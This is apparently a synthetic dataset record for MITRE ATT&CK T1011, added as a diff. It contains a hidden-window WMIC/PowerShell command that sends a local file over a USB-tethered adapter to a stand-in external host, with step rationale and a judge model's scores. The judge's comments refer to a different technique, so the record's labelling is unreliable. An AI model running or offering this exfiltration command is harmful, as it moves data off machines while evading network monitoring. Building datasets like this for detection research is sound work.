@@ -1,0 +1,39 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Remote NDIS*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.199',50888); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Windows\\Temp\\stage.log'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
+  "explanation": "Uses WMIC to invoke PowerShell that binds to a USB tethering (Remote NDIS) adapter and exfiltrates a file to an external host using a high TCP port. This exploits a USB-backed network path distinct from the primary NIC.",
+  "rationale_steps": [
+    "Detect a USB tethering NIC via its Remote NDIS description.",
+    "Bind the TCP client to that interface to force egress over USB tether.",
+    "Connect to an uncommon port on the exfiltration server.",
+    "Send the selected file over the alternate network medium per T1011.",
+    "Refrain from system-level network configuration changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-987933e0-e65af2df",
+  "source_prompt_hash": "987933e0",
+  "timestamp_utc": "2025-09-30T08:13:32.291694Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 3,
+        "syntactic_justification": "Quoting and parentheses are balanced, but backticks escaping every $ (e.g., `$ifc, `$_) inside the PowerShell -Command can break variable assignment and pipeline variable usage, making execution fragile.",
+        "semantic_score": 2,
+        "semantic_justification": "The command uses WMIC to spawn PowerShell and exfiltrate a file via a TCP client bound to a USB NDIS adapter, but it does not leverage a trusted/signed system script proxy (e.g., PubPrn.vbs), so it is misaligned with the described System Script Proxy Execution technique.",
+        "combined_score": 2.5,
+        "confidence": 0.6,
+        "timestamp": "2025-10-01T21:45:59.915593Z"
+      }
+    ],
+    "llm_average_syntactic": 3.0,
+    "llm_average_semantic": 2.0,
+    "llm_average_score": 2.5,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
